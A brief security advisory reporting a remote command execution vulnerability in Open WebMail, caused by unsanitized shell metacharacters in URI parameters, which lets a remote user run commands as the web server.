A vulnerability has been reported in Open WebMail that allows a remote attacker to execute arbitrary commands on a vulnerable host. The problem is due to insufficient sanitization of shell metacharacters that are passed to the vulnerable software through URI parameters.

Exploitation of the vulnerability could allow a non-privileged user to remotely execute arbitrary commands in the context of the web server that is hosting the vulnerable application.
